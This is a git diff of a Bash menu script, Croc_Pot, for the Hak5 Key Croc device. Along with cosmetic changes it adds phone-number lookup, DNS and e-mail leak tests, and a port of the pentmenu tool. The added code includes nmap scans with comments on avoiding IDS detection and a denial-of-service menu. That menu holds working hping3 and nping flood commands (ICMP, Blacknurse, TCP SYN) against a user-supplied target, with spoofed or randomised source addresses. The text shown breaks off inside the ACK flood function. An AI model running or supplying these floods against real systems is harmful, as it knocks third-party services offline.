@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.6.3
+# Version:       1.6.4
 # Category:      Key Croc
 ##
 ##
@@ -59,8 +59,8 @@ MenuColor() {
 	echo -ne "\t\t\t\e[40;1m${2}${clear}${green}->${clear}" ; echo -ne "$(awk -v m=${1} '{printf("'${m_c}'%-'${1}'s\n", $0)}' <<< ${@:3})${clear}\n"
 }
 MenuEnd() {
-	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT $(awk -v m=${1} '{printf("%-'${1}'s'${clear}${green}${array[3]}${clear}'\n", $0)}' <<< ${green})
-\t\t$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]: ')"
+	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT $(awk -v m=${1} '{printf("%-'${1}'s'${clear}${green}${array[3]}' '${clear}'\n", $0)}' <<< ${green})
+\t\t\e[38;5;19;1;48;5;245mCHOOSE AN OPTION AND PRESS [ENTER]:${clear}"
 	unset m_a
 	read m_a
 }
@@ -88,7 +88,7 @@ fi
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
-${green}»»»»»»»»»»»»»CROC_POT«««««««««${clear}${yellow}VER:1.6.3${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${green}»»»»»»»»»»»»»CROC_POT«««««««««${clear}${yellow}VER:1.6.4${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
 ${blue}DEVELOPED BY ${clear}${yellow}SPYWILL ${clear}\e[40m                  ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
 ${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< $(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone))${clear}\e[40m $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
 \e[40;38;5;202m»»»»»»»»»»»»»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m««««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU  TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))MEM:$(awk -v m=8 '{printf("%-8s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
@@ -113,7 +113,7 @@ function invalid_entry() {
 ##
 function read_all() {
 	unset r_a
-	echo -ne "${blue}${*}:${clear}"; read r_a
+	echo -ne "\e[38;5;19;1;48;5;245m${*}:${clear}"; read r_a
 }
 ##
 #----Check for OS keycroc is pluged into usb
@@ -183,7 +183,7 @@ fi
 user_input_passwd() {
 	unset password
 	unset chartCount
-	echo -ne "${blue}ENTER ${2} PASSWORD AND PRESS [ENTER]:${clear}"
+	echo -ne "\e[38;5;19;1;48;5;245mENTER ${2} PASSWORD AND PRESS [ENTER]:${clear}"
 while IFS= read -r -n1 -s char; do
 case "$char" in
 $'\0')
@@ -347,7 +347,7 @@ fi
 #----Mail Attachment Function
 ##
 send_file_e() {
-echo -ne "${blue}ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]:${clear}"; read s_a
+echo -ne "\e[38;5;19;1;48;5;245mENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]:${clear}"; read s_a
 if [ -e "${s_a}" ]; then
 	local CHANGE_FILE="P"
 	local CHANGE_FILE_A="'${s_a}'"
@@ -481,7 +481,7 @@ esac
 ##
 #----Mail add attachment to email
 ##
-echo -ne "${blue}ADD ATTACHMENT Y/N AND PRESS [ENTER]:${clear}"; read a_f
+echo -ne "\e[38;5;19;1;48;5;245mADD ATTACHMENT Y/N AND PRESS [ENTER]:${clear}"; read a_f
 case $a_f in
 [yY] | [yY][eE][sS])
 	mail_file ;;
@@ -640,7 +640,7 @@ target_port() {
 	case $r_a in
 [yY] | [yY][eE][sS])
 	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
-	echo -ne "${blue}ENTER PORT RANGE FOR SCAN AND PRESS [ENTER]:${clear}"; read range_port
+	echo -ne "\e[38;5;19;1;48;5;245mENTER PORT RANGE FOR SCAN AND PRESS [ENTER]:${clear}"; read range_port
 	broken=0
 break_script() {
 	broken=1
@@ -673,13 +673,1210 @@ ssl_scan() {
 	scan_all ssl_scan sslscan --no-failed
 }
 ##
+#----Recon phone number lookup
+##
+phone_lookup() {
+	echo -ne "$(Info_Screen '
+-Phone number lookup 555-555-5555
+-curl https://www.phonelookup.com')\n\n"
+	userAgentList=(
+"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
+"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"
+"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152;"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
+"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20061201 Firefox/2.0.0.17 (Ubuntu-feisty)"
+"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B367"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR"
+"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; InfoPat"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
+)
+userAgent="${userAgentList[ $(expr $RANDOM \% ${#userAgentList[*]}) ]}"
+read_all ENTER PHONE NUMBER TO LOOKUP AND PRESS [ENTER]
+curl -sk https://www.phonelookup.com/1/${r_a} -A "$userAgent" | grep -e "h[14]" | head -n14 | sed -e "s/^\s*//" -e "s/\s*$//" -e "s/<[^>]*>//g" | sed '1c\ ' #-e "s/^.*:\s//"
+}
+##
+#----Recon check dns leak test
+##
+leak_dns() {
+	echo -ne "$(Info_Screen '
+-DNS leak tests
+-BY https://bash.ws/')\n\n"
+local api_domain='bash.ws'
+local error_code=1
+increment_error_code() {
+	error_code=$((error_code + 1))
+}
+echo_bold() {
+	echo -e "${yellow}${1}${clear}"
+}
+echo_error() {
+	(>&2 echo -e "${red}${1}${clear}")
+}
+program_exit() {
+	command -v $1 > /dev/null
+if [ $? -ne 0 ]; then
+	echo_error "Please, install \"$1\""
+	$error_code
+fi
+	increment_error_code
+}
+check_internet_connection() {
+	curl -k --silent --head  --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
+if [ $? -ne 0 ]; then
+	echo_error "No internet connection."
+	$error_code
+fi
+	increment_error_code
+}
+program_exit curl
+program_exit ping
+check_internet_connection
+if command -v jq &> /dev/null; then
+	jq_exists=1
+else
+	jq_exists=0
+fi
+if hash shuf 2>/dev/null; then
+	id=$(shuf -i 1000000-9999999 -n 1)
+else
+	id=$(jot -w %i -r 1 1000000 9999999)
+fi
+for i in $(seq 1 10); do
+	ping -c 1 "${i}.${id}.${api_domain}" > /dev/null 2>&1
+done
+print_servers() {
+if (( $jq_exists )); then
+	echo ${result_json} | \
+	jq  --monochrome-output \
+	--raw-output \
+	".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and  .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
+else
+	while IFS= read -r line; do
+		if [[ "$line" != *${1} ]]; then
+		continue
+		fi
+		ip=$(echo $line | cut -d'|' -f 1)
+		code=$(echo $line | cut -d'|' -f 2)
+		country=$(echo $line | cut -d'|' -f 3)
+		asn=$(echo $line | cut -d'|' -f 4)
+		if [ -z "${ip// }" ]; then
+		continue
+		fi
+		if [ -z "${country// }" ]; then
+			echo "$ip"
+		else
+		if [ -z "${asn// }" ]; then
+			echo "$ip [$country]"
+		else
+			echo "$ip [$country, $asn]"
+		fi
+		fi
+	done <<< "$result_txt"
+fi
+}
+if (( $jq_exists )); then
+	result_json=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?json")
+else
+	result_txt=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?txt")
+fi
+dns_count=$(print_servers "dns" | wc -l)
+echo_bold "Your IP:"
+print_servers "ip"
+echo ""
+if [ ${dns_count} -eq "0" ];then
+	echo_bold "No DNS servers found"
+else
+if [ ${dns_count} -eq "1" ];then
+	echo_bold "You use ${dns_count} DNS server:"
+else
+	echo_bold "You use ${dns_count} DNS servers:"
+fi
+	print_servers "dns"
+fi
+echo ""
+echo_bold "Conclusion:"
+print_servers "conclusion"
+}
+##
+#----Recon check e-mail leak test
+##
+email_leak() {
+	echo -ne "$(Info_Screen '
+-Check e-mail if leaked
+-BY https://bash.ws/')\n\n"
+local api_domain='bash.ws'
+local error_code=1
+increment_error_code() {
+	error_code=$((error_code + 1))
+}
+echo_bold() {
+	echo -e "${yellow}${1}${clear}"
+}
+echo_error() {
+	(>&2 echo -e "${red}${1}${clear}")
+}
+program_exit() {
+	command -v $1 > /dev/null
+if [ $? -ne 0 ]; then
+	echo_error "Please, install \"$1\""
+	$error_code
+fi
+	increment_error_code
+}
+check_internet_connection() {
+	curl -k --silent --head  --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
+if [ $? -ne 0 ]; then
+	echo_error "No internet connection."
+	$error_code
+fi
+	increment_error_code
+}
+print_servers() {
+if (( $jq_exists )); then
+	echo ${result} | \
+	jq  --monochrome-output \
+	--raw-output \
+	".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and  .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
+else
+	while IFS= read -r line; do
+	if [[ "$line" != *${1} ]]; then
+		continue
+		fi
+		ip=$(echo $line | cut -d'|' -f 1)
+		code=$(echo $line | cut -d'|' -f 2)
+		country=$(echo $line | cut -d'|' -f 3)
+		asn=$(echo $line | cut -d'|' -f 4)
+		if [ -z "${ip// }" ]; then
+		continue
+		fi
+		if [ -z "${country// }" ]; then
+			echo "$ip"
+		else
+		if [ -z "${asn// }" ]; then
+			echo "$ip [$country]"
+		else
+			echo "$ip [$country, $asn]"
+		fi
+		fi
+	done <<< "$result"
+fi
+}
+program_exit curl
+program_exit ping
+program_exit mail
+check_internet_connection
+if command -v jq &> /dev/null; then
+	jq_exists=1
+else
+	jq_exists=0
+fi
+if hash shuf 2>/dev/null; then
+	id=$(shuf -i 1000000-9999999 -n 1)
+else
+	id=$(jot -w %i -r 1 1000000 9999999)
+fi
+if (( $jq_exists )); then
+	format="json"
+else
+	format="txt"
+fi
+result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
+mail -s "Test" ${id}@bash.ws  < /dev/null > /dev/null
+for (( ; ; ))
+do
+	result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
+	is_done=$(print_servers "done")
+if [[ $is_done == *"1"* ]]; then
+	break
+fi
+done
+echo_bold "Your IP:"
+print_servers "ip"
+echo ""
+ips_count=$(print_servers "mail" | wc -l)
+if [ ${ips_count} -eq "0" ];then
+	echo_bold "No IPs found in mail header"
+else
+if [ ${ips_count} -eq "1" ];then
+	echo_bold "Mail header has got ${ips_count} IP:"
+else
+	echo_bold "Mail header has got ${ips_count} IPs:"
+fi
+	print_servers "mail"
+fi
+echo ""
+echo_bold "Conclusion:"
+print_servers "conclusion"
+}
+##
+#----Recon pentmenu github by Chris Spillane
+##
+pentmenu() {
+	echo -ne "$(Info_Screen '
+-Welcome to pentmenu!
+-This software is only for responsible, authorised use.
+-YOU are responsible for your own actions!
+-Readme:https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md
+-Big thanks to Chris Spillane - GinjaChris
+-Requirements:bash, curl, netcat, hping3 or nping, openssl, stunnel,
+-nmap, whois, dnsutils, ike-scan')\n\n"
+install_package whois WHOIS pentmenu
+install_package host HOST pentmenu
+install_package hping3 HPING3 pentmenu
+install_package dnsutils DNSUTILS pentmenu
+#install_package stunnel STUNNEL pentmenu
+install_package ike-scan IKE-SCAN pentmenu
+##
+#----pentmenu main menu
+##
+mainmenu() {
+MenuTitle PENTMENU MAIN MENU ; MenuColor 20 1 RECON ; MenuColor 20 2 DOS ; MenuColor 20 3 EXTRACTION ; MenuColor 20 4 VIEW README ; MenuColor 20 5 RETURN TO MAIN MENU ; MenuEnd 23
+	case $m_a in
+	1) reconmenu ;; 2) dosmenu ;; 3) extractionmenu ;; 4) showreadme ;; 5) main_menu ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; mainmenu ;;
+	esac
+}
+##
+#----Recon menu
+##
+reconmenu() {
+MenuTitle RECON SCAN MENU ; MenuColor 20 1 SHOW IP ; MenuColor 20 2 DNS RECON ; MenuColor 20 3 PING SWEEP ; MenuColor 20 4 QUICK SCAN ; MenuColor 20 5 DETAILED SCAN
+MenuColor 20 6 UDP SCAN ; MenuColor 20 7 CHECK SERVER UPTIME ; MenuColor 20 8 IPsec SCAN ; MenuColor 20 9 RETURN TO MAIN MENU ; MenuEnd 23
+	case $m_a in
+	1) showip ; reconmenu;; 2) dnsrecon ; reconmenu;; 3) pingsweep ; reconmenu;; 4) quickscan ; reconmenu;; 5) detailedscan ; reconmenu;; 6) udpscan ; reconmenu;; 7) checkuptime ; reconmenu;; 8) ipsecscan ; reconmenu;; 9) mainmenu ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
+	esac
+}
+##
+#----input Target ip/host
+##
+target_input() {
+	echo -ne "\e[38;5;19;1;48;5;245mPlease enter the target hostname or IP:${clear}"; read -i $TARGET -e TARGET
+}
+##
+#----input Target port
+##
+target_input_port() {
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter port (default is 80):${clear}"; read -i $PORT -e PORT
+}
+##
+#----START SHOW IP
+##
+showip() {
+echo -ne "$(Info_Screen '
+External IP lookup uses curl...')\n\n"
+#---use curl to lookup external IP
+echo -ne "${yellow}External IP is detected as:${clear} " ; curl https://icanhazip.com/s/
+#----show interface IP's
+echo -ne "\n${yellow}Interface IP's are:${clear}\n"
+ip a | grep inet
+#----if ip a command fails revert to ifconfig
+if ! [[ $? = 0 ]]; then
+	ifconfig | grep inet
+fi
+}
+##
+#----START DNS RECON
+##
+dnsrecon() {
+echo -ne "$(Info_Screen '
+-This module performs passive recon via forward/reverse name lookups
+-for the target (as appropriate) and performs a whois lookup')\n\n"
+#----need a target IP/hostname to check
+	target_input
+	host $TARGET
+#----if host command doesnt work try nslookup instead
+if ! [[ $? = 0 ]]; then
+	nslookup $TARGET
+fi
+#----run a whois lookup on the target
+sleep 1 && whois -H $TARGET
+if ! [[ $? = 0 ]]; then
+#----if whois fails, do a curl lookup to ipinfo.io
+	sleep 1 && curl ipinfo.io/$TARGET
+fi
+reconmenu
+}
+##
+#----START PING SWEEP
+##
+pingsweep() {
+echo -ne "$(Info_Screen '
+-This module performs a simple ICMP echo 'ping' sweep')\n\n"
+#----need to know the subnet to scan for live hosts using pings
+target_input
+#----this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
+nmap -sP -PE $TARGET --reason
+}
+##
+#----START QUICK SCAN
+##
+quickscan() {
+echo -ne "$(Info_Screen '
+-This module conducts a scan using nmap
+-Depending on the target, the scan might take a long time to finish')\n\n"
+#----we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
+target_input
+#----How fast should we scan the target?
+#----Faster speed is more likely to be detected by IDS, but is less waiting around
+echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
+Slower scans are more subtle, but faster means less waiting around.
+Default is 3:${clear}\n"; read -i $SPEED -e SPEED
+: ${SPEED:=3}
+nmap -Pn -sS -T $SPEED $TARGET --reason
+}
+##
+#----START DETAILED SCAN
+##
+detailedscan() {
+echo -ne "$(Info_Screen '
+-This module performs a scan using nmap
+-This scan might take a very long time to finish, please be patient')\n\n"
+#----need a target hostname/IP
+target_input
+#----How fast should we scan the target?
+#----Faster speed is more likely to be detected by IDS, but is less waiting around
+echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).\n
+Slower scans are more subtle, but faster means less waiting around.\n
+Default is 3:${clear}"; read -i $SPEED -e SPEED
+: ${SPEED:=3}
+#----scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
+nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
+}
+##
+#----START UDP SCAN
+##
+udpscan() {
+echo -ne "$(Info_Screen '
+-It scans ALL ports on the target system. This may take some time, please be patient')\n\n"
+#----need a target IP/hostname
+target_input
+#----How fast should we scan the target?
+#----Faster speed is more likely to be detected by IDS, but is less waiting around
+echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).\n
+Slower scans are more subtle, but faster means less waiting around.\n
+Default is 3:${clear}"; read -i $SPEED -e SPEED
+: ${SPEED:=3}
+#----launch the scan using nmap
+nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
+}
+##
+#----START CHECK UPTIME
+##
+checkuptime() {
+	echo -ne "$(Info_Screen '
+-This module will attempt to estimate the uptime of a given server, using hping3
+-This is not guaranteed to work')\n\n"
+#----need a target IP/hostname
+target_input
+#----need a target port
+target_input_port
+: ${PORT:=80}
+dos_port_check
+#----how many times to retry the check?
+echo -ne "\n\e[38;5;19;1;48;5;245mRetries? (3 is ideal and default, 2 might also work)${clear}"; read -i $RETRY -e RETRY
+: ${RETRY:=3}
+echo -ne "\n${green}Starting..${clear}\n"
+#----use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
+#----this might not work, but sometimes it does work very well
+hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
+echo -ne "\n${green}Done.${clear}\n"
+}
+##
+#----START IPSEC SCAN
+##
+#----we need to know where to scan
+ipsecscan() {
+target_input
+#----Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
+ENCLIST="1 5 7/128 7/192 7/256"
+#----Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
+HASHLIST="1 2 4 5 6"
+#----Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
+AUTHLIST="1 3 64221 65001"
+#----Diffie-Hellman groups: 1, 2, 5 and 12
+GROUPLIST="1 2 5 12"
+for ENC in $ENCLIST; do
+	for HASH in $HASHLIST; do
+		for AUTH in $AUTHLIST; do
+		for GROUP in $GROUPLIST; do
+		echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
+		done
+	done
+	done
+done
+}
+##
+#----DOS menu
+##
+dosmenu() {
+MenuTitle DOS FLOOD MENU ; MenuColor 21 1 ICMP ECHO FLOOD ; MenuColor 21 2 ICMP BLACKNURSE ; MenuColor 21 3 TCP SYN FLOOD ; MenuColor 21 4 TCP ACK FLOOD ; MenuColor 21 5 TCP RST FLOOD ; MenuColor 21 6 TCP XMAS FLOOD
+MenuColor 21 7 UDP FLOOD ; MenuColor 21 8 SSL DOS ; MenuColor 21 9 SLOWLORIS ; MenuColor 20 10 IPsec DOS ; MenuColor 20 11 DISTRACTION SCAN ; MenuColor 20 12 DNS NXDOMAIN FLOOD ; MenuColor 20 13 RETURN TO MAIN MENU
+MenuEnd 24
+	case $m_a in
+	1) icmpflood ; dosmenu;; 2) blacknurse ; dosmenu;; 3) synflood ; dosmenu;; 4) ackflood ; dosmenu;; 5) rstflood ; dosmenu;; 6) xmasflood ; dosmenu;; 7) udpflood ; dosmenu;; 8) ssldos ; dosmenu;;
+	9) slowloris ; dosmenu;; 10) ipsecdos ; dosmenu;; 11) distractionscan ; dosmenu;; 12) nxdomainflood ; dosmenu;; 13) mainmenu ;; 0) exit 0 ;; [bB]) reconmenu ;; *) invalid_entry ; dosmenu ;;
+	esac
+}
+#----check a valid integer is given for the port, anything else is invalid
+dos_port_check() {
+if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+	PORT=80 && echo -ne "${red}Invalid port, reverting to port 80${clear}\n"
+elif [ "$PORT" -lt "1" ]; then
+	PORT=80 && echo -ne "${red}Invalid port number chosen! Reverting port 80${clear}\n"
+elif [ "$PORT" -gt "65535" ]; then
+	PORT=80 && echo -ne "${red}Invalid port chosen! Reverting to port 80${clear}\n"
+else
+	echo -ne "${yellow}Using Port${clear} $PORT\n"
+fi
+}
+##
+#----START ICMP FLOOD
+##
+icmpflood() {
+	echo -ne "$(Info_Screen '
+-Preparing to launch ICMP Echo Flood using hping3')\n\n"
+#----need a target IP/hostname
+	target_input
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 --flood --spoof $SOURCE $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 --flood --rand-source $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 --flood $TARGET
+else
+	echo -ne "${red}Not a valid option!  Using interface IP${clear}\n"
+	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 --flood $TARGET
+fi
+}
+##
+#----START BLACK NURSE
+##
+blacknurse() {
+	echo -ne "$(Info_Screen 'Preparing to launch ICMP Blacknurse Flood using hping3')\n\n"
+#----need a target IP/hostname
+	target_input
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 -C 3 -K 3 --flood $TARGET
+else
+	echo -ne "${red}Not a valid option!  Using interface IP${clear}"
+	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -1 -C 3 -K 3 --flood $TARGET
+fi
+}
+##
+#----START TCP SYN FLOOD
+##
+synflood() {
+	echo -ne "$(Info_Screen 'TCP SYN Flood uses hping3...checking for hping3...')\n\n"
+if test -f "/usr/sbin/hping3"; then
+	echo -ne "${green}hping3 found, continuing!${clear}\n";
+#----hping3 is found, so use that for TCP SYN Flood
+#----need a target IP/hostname
+	target_input
+#----need a port to send TCP SYN packets to
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----What source address to use? Manually defined, or random, or outgoing interface IP?
+	echo -ne "\e[38;5;19;1;48;5;245mEnter Source IP, or [r]andom or [i]nterface IP (default):${clear}:"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----should any data be sent with the SYN packet?  Default is to send no data
+	echo -ne "\n\e[38;5;19;1;48;5;245mSend data with SYN packet? [y]es or [n]o (default)${clear}:"; read -i $SENDDATA -e SENDDATA
+	: ${SENDDATA:=n}
+if [[ $SENDDATA = y ]]; then
+#----we've chosen to send data, so how much should we send?
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of data bytes to send (default 3000):${clear}"; read -i $DATA -e DATA
+	: ${DATA:=3000}
+#----If not an integer is entered, use default
+if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
+	DATA=3000 && echo -ne "${red}Invalid integer! ${clear}${green} Using data length of 3000 bytes${clear}\n"
+fi
+#----if $SENDDATA is not equal to y (yes) then send no data
+else
+	DATA=0
+fi
+#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
+#----fragmentation should therefore place more stress on the target system
+if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+	echo -ne "${yellow}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
+elif [ "$SOURCE" = "r" ]; then
+	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
+elif [ "$SOURCE" = "i" ]; then
+	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
+else
+	echo -ne "${red}Not a valid option!${clear}${yellow}  Using interface IP${clear}\n"
+	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
+	hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
+fi
+#----No hping3 so using nping for TCP SYN Flood
+else
+	echo -ne "${red}hping3 not found :( trying nping instead${clear}\n"
+	echo -ne "${yellow}Trying TCP SYN Flood with nping..this will work but is not ideal${clear}\n"
+#----need a valid target ip/hostname
+target_input
+#----need a valid target port
+	target_input_port
+	: ${PORT:=80}
+	dos_port_check
+#----define source IP or use outgoing interface IP
+	echo -ne "\e[38;5;19;1;48;5;245mEnter Source IP or use [i]nterface IP (default):${clear}"; read -i $SOURCE -e SOURCE
+	: ${SOURCE:=i}
+#----How many packets to send per second?  default is 10k
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter number of packets to send per second (default is 10,000):${clear}"; read RATE
+	: ${RATE:=10000}
+#----default is 100k, so using default values will send 10k packets per second for 10 seconds
+	echo -ne "\n\e[38;5;19;1;48;5;245mEnter total number of packets to send (default is 100,000):${clear}"; read TOTAL
+	: ${TOTAL:=100000}
+	echo -ne "\n${green}Starting TCP SYN Flood...${clear}\n"
+#----begin TCP SYN flood using values defined earlier
+if 	[ "$SOURCE" = "i" ]; then
+	nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+else
+	nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+fi
+fi
+}
+##
+#----START TCP ACK FLOOD
+##
+ackflood() {
+	echo -ne "$(Info_Screen 'TCP ACK Flood uses hping3...checking for hping3...')\n\n"
+if test -f "/usr/sbin/hping3"; then
+	echo -ne "${green}hping3 found, continuing!${clear}\n";
